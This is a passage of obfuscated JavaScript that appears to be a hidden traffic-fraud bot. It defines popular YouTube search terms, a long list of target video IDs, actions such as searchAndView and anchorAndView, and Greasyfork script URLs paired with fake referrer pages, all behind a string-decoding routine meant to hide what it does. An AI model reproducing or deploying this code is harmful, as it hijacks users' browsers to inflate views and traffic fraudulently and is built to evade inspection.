'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0xf1f + -0xb * -0x32b + -0x31ee)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x7 * 0x30b + 0x2 * -0x1b2 + -0xf * 0x131)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x1 * -0x4db + 0x2 * 0x5ae + -0xf4 * 0x11);

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x160f + -0x2047 + 0x3656);
    let h = e[f];
    if (c['TNTLkP'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x15b4 + -0x1f9f * 0x1 + 0xb * 0x4d9, r, s, t = 0xf2 * -0xd + 0x1 * -0x17bf + -0x3 * -0xc03; s = m['charAt'](t++); ~s && (r = q % (0x12c2 + 0x86f * -0x2 + 0x2 * -0xf0) ? r * (0x1 * 0xc25 + -0x3 * 0x920 + 0x529 * 0x3) + s : s, q++ % (-0x239b + 0xae6 + 0x18b9 * 0x1)) ? o += String['fromCharCode'](0x1 * 0xe55 + -0xdb6 + 0x60 & r >> (-(-0x94d + -0x2421 + 0x2d70) * q & 0x4 * 0x5b5 + 0x5 * 0x213 + -0x212d)) : -0x23c9 + -0x7be * 0x2 + 0x3345) {
          s = n['indexOf'](s);
        }
        for (let u = 0x532 + 0x53f + -0xa71, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x1 * 0x22c7 + 0x1382 + -0x3639))['slice'](-(-0x9aa + -0x2 * 0x79d + 0x2 * 0xc73));
        }
        return decodeURIComponent(p);
      };
      c['ygUqIq'] = i, b = arguments, c['TNTLkP'] = !![];
    }
    const j = e[-0x228 + 0x7 * 0x1df + -0xaf1],
      k = f + j,
      l = b[k];
    return !l ? (h = c['ygUqIq'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    Z(0x19, 'Vsl$') + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    Y(0x1c) + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + Y(0x7) + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': Z(0xb, 'cQR&') + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + Y(0x1b) + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0xf) + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
